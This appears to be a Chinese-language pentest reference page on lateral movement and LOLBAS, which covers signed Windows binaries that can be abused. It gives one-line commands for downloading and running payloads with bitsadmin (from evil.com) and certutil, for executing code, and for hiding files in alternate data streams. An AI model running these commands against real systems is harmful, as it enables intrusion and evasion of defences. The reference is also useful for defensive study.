横向移动
========================================

常见入口
----------------------------------------
- SMB弱密码
- SqlServer弱密码

LOLBAS
----------------------------------------

简介
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
LOLBAS，全称Living Off The Land Binaries and Scripts (and also Libraries)，是一种白利用方式，是在2013年DerbyCon由Christopher Campbell和Matt Graeber发现，最终Philip Goh提出的概念。

这些程序一般有有Microsoft或第三方认证机构的签名，但是除了可以完成正常的功能，也能够被用于内网渗透中。这些程序可能会被用于：下载安全恶意程序、执行恶意代码、绕过UAC、绕过程序控制等。

常见程序
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- appsyncvpublishing.exe
    - 执行powershell
- bitsadmin.exe
    - 下载文件 ``bitsadmin /transfer <job_name> /priority <priority> <remote_path> <local_path>``
    - 下载文件 ``bitsadmin /create 1 bitsadmin /addfile 1 https://evil.com/autoruns.exe c:\data\playfolder\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1``
    - 复制文件 ``bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset``
    - 代码执行 ``bitsadmin /create 1 & bitsadmin /addfile 1 c:\windows\system32\cmd.exe c:\data\playfolder\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\data\playfolder\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset``
- cdb.exe
- certutil.exe
    - 可安装、备份、删除、管理和执行证书
    - 证书存储相关功能
    - 下载文件 ``certutil -urlcache -split -f https://addr/example.exe``
    - 注意 certutil 是有cache的，需要显式删除
    - base64 编解码 ``certutil -encode`` /  ``certutil -decode``
- cmd.exe
- cmstp.exe
- control.exe
    - `加载dll <https://www.dearbytes.com/blog/playing-around-with-nsa-hacking-tools/>`_
- csc.exe
    - 编译 C# 载荷
- cscript.exe
    - 执行脚本
- extexport.exe
- expand.exe
    - 展开一个或多个压缩文件
- forfiles.exe
    - ``forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe``
- mofcomp.exe
- makecab.exe
- msbuild.exe
    - 构建应用程序
- mshta.exe
    - HTML应用
- msiexec.exe
    - 安装msi
    - 加载dll
- msxsl.exe
    - 处理XSL程序
- netsh.exe
- installutil.exe
    - 安装/卸载程序组件
- IEExec.exe
    - .NET Framework附带程序
- powershell.exe
- psexec.exe
    - https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec
- reg.exe
    - 注册表控制台
- regedit.exe
    - 注册表修改
- regsvr32.exe
    - 注册动态链接库/ActiveX控件
- rundll32.exe
    - 执行DLL文件中的内部函数
- sc.exe
    - 查看服务状态管理
- schtasks.exe
    - 定时计划任务
- shred
    - 重复写入文件，防止文件恢复
- type.exe
    - 利用ads隐藏文件 ``type <filepath> <target_file:ads>``
- wmic.exe
    - Windows管理工具
- windbg.exe
- winrm.exe
- wscript.exe
    - 脚本引擎
- waitfor.exe
    - 用于同步网络中计算机，可以发送或等待系统上的信号。
